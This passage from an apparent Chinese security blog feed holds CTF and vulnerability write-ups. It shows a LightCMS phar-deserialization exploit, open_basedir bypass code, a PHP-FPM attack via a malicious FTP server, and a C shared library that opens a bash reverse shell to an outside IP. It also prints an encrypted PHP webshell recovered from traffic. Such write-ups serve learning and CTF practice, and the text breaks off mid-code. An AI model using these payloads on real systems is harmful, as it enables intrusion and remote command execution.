class="hljs-number">4</span>-gd对应你自己的安装即可<br></code></pre></div></td></tr></table></figure><p>laravel框架属实还没学明白，只能照着网上的复现，这个漏洞出在 <code>app/Http/Controllers/Admin/NEditorController.php</code>中的上传图片的功能：</p><p><img src="https://img-blog.csdnimg.cn/20210704175218866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>知道漏洞发生在哪了，我自己先分析了下这串代码，</p><blockquote><p>关于config函数config 函数</p><p>如果我要的配置不在.env 文件中而在 mail.php 文件中，我要临时设置和读取该怎么办，这个时候我们就要使用 config 函数了，这个函数在使用上有些特色，我们一一说。</p><p>比如我现在要读取 mail.php 文件中的 driver 配置项，可以使用 config(‘mail.driver’), 如果要获取 mail.php 文件中所有的配置项可以使用 config(‘mail’)，注意两种方式的区别。</p><p>如果我们想临时的修改配置，但是又不像让它生效，可以使用 config([‘mail.driver’=&gt;’sendmail’])，这样邮箱配置中的驱动配置就改为了 sendmail，不过这种方式是临时的，并不会写入到配置文件中。</p><p>先用过滤器过滤变量，初始化curl话柄来获取远程资源的内容，然后使用 Image:make 模块进行解析用imagecreatefromwebp获得的WebP 图像文件，</p><table><thead><tr><th align="center"><strong>文件名称</strong></th><th align="right"><strong>配置类型</strong></th></tr></thead><tbody><tr><td align="center">app.php</td><td align="right">应用相关，如项目名称、时区、语言等</td></tr><tr><td align="center">auth.php</td><td align="right">用户授权，如用户登录、密码重置等</td></tr><tr><td align="center">broadcasting.php</td><td align="right">事件广播系统相关配置</td></tr><tr><td align="center">cache.php</td><td align="right">缓存相关配置</td></tr><tr><td align="center">database.php</td><td align="right">数据库相关配置，包括 MySQL、Redis 等</td></tr><tr><td align="center">filesystems.php</td><td align="right">文件存储相关配置</td></tr><tr><td align="center">mail.php</td><td align="right">邮箱发送相关的配置</td></tr><tr><td align="center">queue.php</td><td align="right">队列系统相关配置</td></tr><tr><td align="center">services.php</td><td align="right">放置第三方服务配置</td></tr><tr><td align="center">session.php</td><td align="right">用户会话相关配置</td></tr><tr><td align="center">view.php</td><td align="right">视图存储路径相关配置</td></tr></tbody></table></blockquote><p><img src="https://img-blog.csdnimg.cn/20210704175147723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里config函数读取light.image_upload.driver的值，判断是不是上传到本地，如果不是的话就获取class然后实例化，回调catchImage函数</p><p>然后获取请求结果，转换为数组去重，接着遍历数组，随后跟进fetch Image File函数</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20210703021425786.png" alt="image-20210703021425786"></p><p>可以看到先用过滤器看是否<code>$url</code>是否是<code>url</code>。注意这不仅http协议可以通过，其它如phar协议同样也可以。接着尝试 curl 访问 url，并返回结果给<code>$data</code>，然后通过<code>isWebp()</code>判断<code>$data</code>是否是 webp 文件，其中会调用<code>Intervention\\Image\\Facades\\Image</code>的 make方法，对图片内容进行解析</p><p>逐步跟进<code>vendor/intervention/image/src/Intervention/Image/ImageManager.php</code></p><p><img src="https://img-blog.csdnimg.cn/20210703171304422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>继续跟进到<code>vendor/intervention/image/src/intervention/Image/AbstractDriver.php</code>，通过 <code>init()</code>，然后传入 <code>decoder-&gt;init()</code></p><p><img src="https://img-blog.csdnimg.cn/20210703171404901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>跟进init到<code>vendor/intervention/image/src/Intervention/Image/AbstractDecoder.php</code></p><p><img src="https://img-blog.csdnimg.cn/20210704175114220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看 <code>isUlr()</code> 方法，同样也是判断<code>$data</code>是否为 url，这时<code>$data</code>是 phar 协议，可以 return true，所以 <code>$data</code>传入<code>initFromUrl()</code></p><p><img src="https://img-blog.csdnimg.cn/20210703171548952.png" alt="在这里插入图片描述"></p><p>查看<code>initFromUrl()</code>方法，可以看到 <code>file_get_contents()</code> 触发 phar 反序列化</p><p><img src="https://img-blog.csdnimg.cn/20210703171738283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>exp如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>&#123; //创建一个事件并将数组中的事件（键）和事件监听者（数组的键值）进行绑定<br>    <span class="hljs-title">protected</span> $<span class="hljs-title">events</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$evnet</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-keyword">new</span> Dispatcher(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;events = <span class="hljs-variable">$events</span>;<br>    &#125;<br>&#125;<br>    <span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Events</span>&#123;<br>        <br>        <span class="hljs-title">class</span> <span class="hljs-title">Dispatcher</span>&#123;  //触发事件类<br>            <span class="hljs-title">protected</span> $<span class="hljs-title">listeners</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;listeners=[<span class="hljs-variable">$event</span>=&gt;[<span class="hljs-string">&#x27;system&#x27;</span>]];<br>            &#125;<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>    $phar = new Phar(&#x27;phar.phar&#x27;);  //后缀名必须为phar<br>    <span class="hljs-variable">$phar</span> -&gt; startBuffering();<br>    <span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$o</span>));<br>    <span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$o</span>);   <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">//添加要压缩的文件 </span><br>   <span class="hljs-variable">$phar</span> -&gt; stopBuffering();  <span class="hljs-comment">//签名自动计算</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>具体的laravel事件机制可以看看</p><p>[]: <a href="https://blog.csdn.net/qq_16877261/article/details/79095039?utm_source=blogxgwz0">https://blog.csdn.net/qq_16877261/article/details/79095039?utm_source=blogxgwz0</a></p><p><img src="https://img-blog.csdnimg.cn/20210704173030893.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210704173050552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后在发包即可</p><p><img src="https://img-blog.csdnimg.cn/20210704175044902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>LightCMS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>LightCMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>one_Pointer_php</title>
    <link href="/2021/06/03/2021-6-3-%E8%93%9D%E5%B8%BDweb/"/>
    <url>/2021/06/03/2021-6-3-%E8%93%9D%E5%B8%BDweb/</url>
    
    <content type="html"><![CDATA[<h2 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h2><h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul><li>利用整数溢出获取webshell</li><li>open_basedir的绕过</li><li>disable_function绕过（伪造FastCGI请求PHP-CGI）</li><li>恶意ftp服务直接打</li></ul><p>题目给了源码，两个php文件，代码比较简单，需要绕过$count[]=1进入到eval命令执行</p><h4 id="php-整数溢出"><a href="#php-整数溢出" class="headerlink" title="php 整数溢出"></a>php 整数溢出</h4><blockquote><p>在 PHP 中，整型数是有一个范围的，对于32位的操作系统，最大的整型是2147483647，即2的31次方，最小为-2的31次方。如果给定的一个整数超出了整型（integer）的范围，将会被解释为浮点型（float）。同样如果执行的运算结果超出了整型（integer）范围，也会返回浮点型（float）。</p></blockquote><p>则可以利用如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$userconut</span> = <span class="hljs-number">9223372036854775806</span>;<br><span class="hljs-variable">$count</span>[++<span class="hljs-variable">$userconut</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$count</span>[]=<span class="hljs-number">1</span>;<br>print_r(<span class="hljs-variable">$count</span>);<br></code></pre></div></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">PHP Warning:  Cannot add element to the <span class="hljs-keyword">array</span> <span class="hljs-keyword">as</span> the next element is already occupied in C:\Users\LiuSir\Desktop\www\index.php on line <span class="hljs-number">4</span><br><br>Warning: Cannot add element to the <span class="hljs-keyword">array</span> <span class="hljs-keyword">as</span> the next element is already occupied in C:\Users\LiuSir\Desktop\www\index.php on line <span class="hljs-number">4</span><br><span class="hljs-keyword">Array</span><br>(<br>    [<span class="hljs-number">9223372036854775807</span>] =&gt; <span class="hljs-number">1</span><br>)<br>[Finished in <span class="hljs-number">0.2</span>s]<br></code></pre></div></td></tr></table></figure><p>可以看到代码报错了。这是因为先让</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$user</span>-&gt;count 为 PHP_INT_MAX - <span class="hljs-number">1</span>，<br></code></pre></div></td></tr></table></figure><p>自增之后，数组 count 的最大键为 PHP_INT_MAX，此时 $count[]=1，新键等于数组的最大键+1，键值为1，这里键为 PHP_INT_MAX + 1，导致报错，返回值为0，然后就可以成功绕过并进入到 eval() 中了。</p><p>拿到url编码后的序列化数据，改cookie即可进行eval执行命令</p><blockquote><p>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D;</p></blockquote><p>发现disable_function<br><img src="https://img-blog.csdnimg.cn/20210603151340468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>open_basedir<br><img src="https://img-blog.csdnimg.cn/20210603151416151.png" alt="在这里插入图片描述"></p><h4 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h4><ul><li>ini_set绕过绕过<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;z33&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;z33&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></div></td></tr></table></figure>或者glob协议绕过<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-comment">// normal files</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();<br>&#125;<br><span class="hljs-comment">// special files (starting with a dot(.))</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();<br>&#125;<br>sort(<span class="hljs-variable">$file_list</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$file_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure></li></ul><p>结果如下<br><img src="https://img-blog.csdnimg.cn/20210603151756833.png" alt="在这里插入图片描述"><br>在根目录里发现了 flag。</p><p>尝试使用 file_get_contents() 等函数读取均失败，猜测是出题人对flag的权限做了限制。那我们就要想办法提权了，但是要提权则必须先拿到 Shell 执行命令，也就是得要先绕过 disable_functions。</p><p>读取/proc/self/cmdline发现进程时php-fpm: pool www。猜测应该是攻击php-fpm来绕过disable_functions。则先读取nginx配置文件/etc/nginx/nginx.conf发现有发现有</p><blockquote><p>include /etc/nginx/sites-enabled/*</p><ul><li>sites_availables 指的是所有 nginx 站点；</li><li>sites_enabled 指的是当前开启的 nginx 站点；</li></ul></blockquote><p>再接着读/etc/nginx/sites-enabled/default，发现</p><p><img src="https://img-blog.csdnimg.cn/20210603152428650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>发现 PHP-FPM 绑定在了本地 9001 端口上。</p><p>好了，既然我们可以通过 eval() 执行任意代码，那我们便可以构造恶意代码进行 SSRF，利用 SSRF 攻击本地的 PHP-FPM。但是由于这里禁用了许多函数和类，像那些普通能构成 SSRF 的函数和类都无法使用，但是 FTP 协议未被禁用。</p><p>我们可以通过在 VPS上搭建恶意的FTP服务器，骗取目标主机将 Payload 重定向到自己的 9001 端口上，从而实现攻击 PHP-FPM 并执行命令。</p><p>这里利用了 FTP 协议工作方式中的被动方式，在该方式中，FTP 客户端和服务端在建立控制通道的时候用二者的TCP 21端口建立连接，建立连接后发送 PASV 命令。FTP 服务器收到 PASV 命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接到 FTP 服务器的此高端端口，通过三次握手建立通道，然后FTP服务器将通过这个端口进行数据的传送。</p><p>首先尝试使用 Gopherus 生成的攻击 PHP-FPM 的 Payload 失败，然后尝试通过加载恶意 .so 扩展的方式。网上的脚本.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><a href="https://err0r.top/article/bluehat2021/">https://err0r.top/article/bluehat2021/</a><br><a href="http://bubb1e.com/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021WP_WEB/#0x02-one-Pointer-php">http://bubb1e.com/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021WP_WEB/#0x02-one-Pointer-php</a><br><a href="https://www.anquanke.com/post/id/233454">https://www.anquanke.com/post/id/233454</a><br><a href="https://xz.aliyun.com/t/9544#toc-6">https://xz.aliyun.com/t/9544#toc-6</a><br><a href="https://www.infoq.cn/article/vIcwtItzVK7B4YNOEj3e">https://www.infoq.cn/article/vIcwtItzVK7B4YNOEj3e</a></p>]]></content>
    
    
    <categories>
      
      <category>ssrf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TSCTFWP</title>
    <link href="/2021/05/24/2020-5-24-TSCTFWP/"/>
    <url>/2021/05/24/2020-5-24-TSCTFWP/</url>
    
    <content type="html"><![CDATA[<p>问卷就不说了</p><h4 id="Ohmypassword"><a href="#Ohmypassword" class="headerlink" title="Ohmypassword"></a>Ohmypassword</h4><p>进入流量包 过滤出来</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">http contains &quot;password“<br></code></pre></div></td></tr></table></figure><p>即可看到</p><p><img src="https://img-blog.csdnimg.cn/20210524131625628.png" alt="在这里插入图片描述"></p><p>追踪第一个流量包即可发现在最后一部分上传了一个php文件</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br><span class="hljs-variable">$post</span>=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=openssl_decrypt(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>@<span class="hljs-keyword">new</span> C(<span class="hljs-variable">$params</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>很容易分析出来用pass传参生成了一个key，然后php://input协议获取post流中的内容，可以返现这个key是用来AES解密的，之后很容易想到过滤出pass关键字<br><img src="https://img-blog.csdnimg.cn/20210524131859997.png" alt="在这里插入图片描述"><br>用最后出传入的pass值生成的key，追踪流即可发现生成的key</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">key</span> = <span class="hljs-number">09</span>f<span class="hljs-number">2</span>d<span class="hljs-number">96615775182</span><br></code></pre></div></td></tr></table></figure><p>有了key就可以对post流中的数据流进行解密，脚本如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// $key=substr(md5(uniqid(rand())),16);</span><br><span class="hljs-comment">// echo $key;</span><br><span class="hljs-variable">$post</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;09f2d96615775182&quot;</span>;<br><span class="hljs-comment">#$key = &quot;dadc0b42da0fd57d&quot;;</span><br><span class="hljs-variable">$post</span>=openssl_decrypt(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>$post即为post流中的内容,也可以使服务器响应返回的内容。接下来就是对找对流量包。这个过程很艰难，因为流量包太多了。最后过滤出http协议在后面一部分找到了对的流量包。第一个在3682的流量包,解密如下</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 